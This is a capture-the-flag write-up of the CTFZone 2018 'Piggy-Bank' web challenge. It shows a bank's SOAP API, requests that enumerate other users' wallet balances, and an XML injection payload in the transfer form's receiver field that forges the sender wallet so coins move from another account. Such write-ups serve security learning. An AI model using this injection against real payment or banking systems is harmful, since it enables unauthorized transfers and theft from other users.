---
title: "2018 Ctfzone Piggybank"
date: 2018-07-23T10:44:58+02:00
draft: false
tags: [web, injection, xml, 2018]
---

# Piggy-Bank (WEB - EASY) - 29 solves

```
Hack some bank for me.
```

First, we played a little bit with the website - there were index, register and login pages accessible for all the users, and _Profile_, _VIP_, _For developers_ and _Transfer_ pages for logged-in users.

![The web page](/blog/2018-ctfzone/piggybank/main_page.png)

_Profile_ page just showed the account balance, _Transfer_ allowed moving your money to other accounts, and _VIP_ was just saying that it'd reveal its secrets once we have 1'000'000 coins on our account (and we started with 110).
Navigating through _For developer_'s sources revealed one significant comment:

```
<div class="tab tab_5">Especially for pig-developers, we have the coolest api, which they will soon be able to use!</div>
<!-- Link to the API (http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.wsdl.php) (Testing stage) -->
```

It turned out, that there's a SOAP API underneath:

```
HTTP/1.1 200 OK
Date: Sat, 21 Jul 2018 10:37:15 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 2907
Connection: close
Content-Type: text/xml; charset=utf-8

<?xml version="1.0" encoding="utf-8"?><wsdl:definitions name="Bank"
             targetNamespace="urn:Bank"
             xmlns:tns="urn:Bank"
             xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
             xmlns:xsd="http://www.w3.org/2001/XMLSchema"
             xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"
             xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/"
             xmlns="http://schemas.xmlsoap.org/wsdl/">

    <message name="BalanceRequest">
        <part name="wallet_num" type="xsd:decimal"/>
    </message>

    <message name="BalanceResponse">
        <part name="code" type="xsd:float"/>
        <part name="status" type="xsd:string"/>
    </message>

    <message name="internalTransferRequest">
        <part name="receiver_wallet_num" type="xsd:decimal"/>
        <part name="sender_wallet_num" type="xsd:decimal"/>
        <part name="amount" type="xsd:float"/>
        <part name="token" type="xsd:string"/>
    </message>

    <message name="internalTransferResponse">
        <part name="code" type="xsd:float"/>
        <part name="status" type="xsd:string"/>
    </message>

    <portType name="BankServicePort">
        <operation name="requestBalance">
            <input message="tns:BalanceRequest"/>
            <output message="tns:BalanceResponse"/>
        </operation>
        <operation name="internalTransfer">
            <input message="tns:internalTransferRequest"/>
            <output message="tns:internalTransferResponse"/>
        </operation>
    </portType>

    <binding name="BankServiceBinding" type="tns:BankServicePort">
        <soap:binding style="rpc" transport="http://schemas.xmlsoap.org/soap/http"/>
        <operation name="requestBalance">
            <soap:operation soapAction="urn:requestBalanceAction"/>
            <input>
                <soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
            </input>
            <output>
                <soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
            </output>
        </operation>
        <operation name="internalTransfer">
            <soap:operation soapAction="urn:internalTransferAction"/>
            <input>
                <soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
            </input>
            <output>
                <soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
            </output>
        </operation>
    </binding>

    <wsdl:service name="BankService">
        <wsdl:port name="BankServicePort" binding="tns:BankServiceBinding">
            <soap:address location="http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php" />
        </wsdl:port>
    </wsdl:service>
</wsdl:definitions>
```

At this point we thought, that the challenge is about either finding the vulnerability in transfer feature (like race condition or lack of appropriate checks) or somewhere else in API, and then materializing 1'000'000 coins on the account which would result in access to the _VIP_ page.
We were not so much wrong. 

Next, we tried to actually use the API. From the _wsdl_ file we identified two endpoints: `requestBalance` and `internalTransfer`, and utilized the first one to scan other accounts balances. 

```
POST /api/bankservice.php HTTP/1.1
Content-Type: text/xml
cache-control: no-cache
Postman-Token: ef43c527-538f-49ed-862e-57c80e3f320e
User-Agent: PostmanRuntime/7.1.5
Accept: */*
Host: web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one
Accept-Encoding: gzip, deflate
Content-Length: 230
Connection: close

<?xml version="1.0" encoding="utf-8"?>

<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">

<SOAP-ENV:Body>
	<requestBalance><id>2392</id></requestBalance>
</SOAP-ENV:Body>

</SOAP-ENV:Envelope>
```

```
HTTP/1.1 200 OK
Date: Sat, 21 Jul 2018 20:29:52 GMT
Server: Apache/2.4.18 (Ubuntu)
Cache-Control: no-store, no-cache
Expires: Sat, 21 Jul 2018 20:29:52 +0000
Vary: Accept-Encoding
Content-Length: 549
Connection: close
Content-Type: text/xml; charset=utf-8

<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="urn:Bank" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:requestBalanceResponse><code xsi:type="xsd:float">0</code><status xsi:type="xsd:string">110</status></ns1:requestBalanceResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>

```

With this we were able to identify an account with over 1'000'000 coins using Burp Suite's _Intruder_:

![Setup, 1](/blog/2018-ctfzone/piggybank/sniper_setup1.png)
![Setup, 2](/blog/2018-ctfzone/piggybank/sniper_setup2.png)
![Setup, 3](/blog/2018-ctfzone/piggybank/sniper_setup3.png)

We could differentiate the empty and full wallets by just looking at responses' lengths:

![Result](/blog/2018-ctfzone/piggybank/sniper_results.png)

Then, to use the second endpoint to transfer money, we needed to find the valid token, as in _wsdl_ file:

```
<message name="internalTransferRequest">
	<part name="receiver_wallet_num" type="xsd:decimal"/>
	<part name="sender_wallet_num" type="xsd:decimal"/>
	<part name="amount" type="xsd:float"/>
	<part name="token" type="xsd:string"/>
</message>
```

Unfortunately, we were not able to find it anywhere (even though there was a little bit more information revealed with the response to `auth.php` file after logging in), therefore we stopped for a while.

But, it turned out that the transfer page is using this very API endpoint under the hood, and it's prone to injection attack:

```
receiver=1348</receiver_wallet_num>
<sender_wallet_num xsi:type="xsd:decimal">1337</sender_wallet_num>
<amount xsi:type="xsd:float"><!--
&amount=-->200000
```

![The injection](/blog/2018-ctfzone/piggybank/injection_request.png)

Go [here](https://blog.veryhax.ninja/blog/ctfzone18-piggy-bank/) for an additional explaination. 

After sending a few requests, we've landed with many coins:

![The wealth](/blog/2018-ctfzone/piggybank/profile_with_1m.png)

and were able to fetch the flag from VIP zone:

![The flag](/blog/2018-ctfzone/piggybank/vip.png)


What could be done else, was just transferring small amounts of money from other users with many `internalTransferRequest` calls.
